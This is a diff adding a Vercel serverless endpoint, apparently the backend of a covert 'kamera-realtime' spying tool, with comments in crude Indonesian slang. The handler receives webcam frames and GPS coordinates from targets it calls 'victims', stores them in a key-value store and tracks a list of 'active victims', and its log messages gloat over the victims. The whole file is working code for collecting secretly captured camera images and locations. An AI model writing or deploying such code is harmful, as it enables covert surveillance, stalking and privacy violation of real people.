@@ -1,0 +1,36 @@
+// api/upload-frame.js (di project kamera-realtime)
+import { kv } from '@vercel/kv'; // Pastikan lo udah install @vercel/kv: npm install @vercel/kv
+
+export default async function handler(req, res) {
+    if (req.method !== 'POST') {
+        return res.status(405).send('Metode tidak diizinkan, bangsat!');
+    }
+
+    const { victimId, type, imageData, latitude, longitude } = req.body;
+
+    if (!victimId || !type) {
+        return res.status(400).send('Data tidak lengkap, dasar bego!');
+    }
+
+    try {
+        if (type === 'frame' && imageData) {
+            // Simpan frame terbaru dari korban ini, expire dalam 5 menit
+            await kv.set(`victim:${victimId}:lastFrame`, imageData, { ex: 300 });
+            await kv.set(`victim:${victimId}:lastUpdate`, Date.now(), { ex: 300 }); // Timestamp biar tahu kapan terakhir aktif
+            await kv.sadd('activeVictims', victimId); // Tambahkan ID korban ke daftar korban aktif
+            console.log(`Frame baru dari korban ${victimId} diterima, hahahaha!`);
+        } else if (type === 'location' && latitude && longitude) {
+            // Simpan lokasi korban, expire dalam 5 menit
+            await kv.set(`victim:${victimId}:location`, JSON.stringify({ latitude, longitude }), { ex: 300 });
+            await kv.sadd('activeVictims', victimId); // Tambahkan ID korban ke daftar korban aktif
+            console.log(`Lokasi baru dari korban ${victimId} diterima, biar tahu dia dimana!`);
+        } else {
+            return res.status(400).send('Tipe data tidak valid atau data tidak lengkap, sialan!');
+        }
+
+        res.status(200).send('Data diterima, bajingan!');
+    } catch (error) {
+        console.error('Gagal memproses data di KV, keparat:', error);
+        res.status(500).send('Kesalahan server, anjing!');
+    }
+}
